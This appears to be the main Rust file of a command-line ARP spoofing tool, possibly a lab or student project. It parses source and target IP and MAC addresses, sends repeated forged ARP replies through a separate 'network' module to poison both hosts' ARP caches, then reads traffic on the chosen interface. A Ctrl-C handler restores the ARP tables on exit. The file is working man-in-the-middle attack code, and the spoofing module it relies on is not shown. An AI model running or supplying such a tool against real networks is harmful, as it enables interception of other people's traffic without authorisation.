mod network;
use network::{arp_reply, arp_spoof, read_network_interface};
use pnet::util::MacAddr;

use std::net::Ipv4Addr;
use ctrlc;

fn main() {
    // add an handler for ctrl+c
    

    // get arguments
    // <IP-src> <MAC-src> <IP-target> <MAC-target> <interface>
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 6 {
        println!("Usage: {} <IP-src> <MAC-src> <IP-target> <MAC-target> <interface>", args[0]);
        std::process::exit(1);
    }
    if !check_args(args.clone()) {
        std::process::exit(1);
    }
    // convert arguments to Ipv4Addr and MacAddr
    // and handle errors with error messages with emojis
    let ip_src = args[1].parse::<Ipv4Addr>().unwrap_or_else(|_| {
        println!("Invalid IP address");
        std::process::exit(1);
    });
    let mac_src = args[2].parse::<MacAddr>().unwrap_or_else(|_| {
        println!("Invalid MAC address");
        std::process::exit(1);
    });
    let ip_target = args[3].parse::<Ipv4Addr>().unwrap_or_else(|_| {
        println!("Invalid IP address");
        std::process::exit(1);
    });
    let mac_target = args[4].parse::<MacAddr>().unwrap_or_else(|_| {
        println!("Invalid MAC address");
        std::process::exit(1);
    });
    let interface_name = args[5].clone();
    ctrlc::set_handler(move || {
        // reset arp tables
        arp_reply(ip_src, mac_src, ip_target, mac_target, &interface_name);
        arp_reply(ip_target, mac_target, ip_src, mac_src, &interface_name);
        println!("ARP tables reset");
        std::process::exit(0);
    }).expect("Error setting Ctrl-C handler");

    let interface_name = args[5].clone();
    for _ in 0..5 {
        arp_spoof(ip_target, mac_target, ip_src, &interface_name);
        arp_spoof(ip_src, mac_src, ip_target, &interface_name);
    }

    read_network_interface(interface_name);
}

/// Function that receives the arguments and checks that the IPs are valid ipv4
/// return a boolean
fn check_args(args: Vec<String>) -> bool {
    let ip_src = args[1].parse::<Ipv4Addr>();
    let ip_target = args[3].parse::<Ipv4Addr>();
    if ip_src.is_err() || ip_target.is_err() {
        println!("Invalid IP address");
        return false;
    }
    true
}
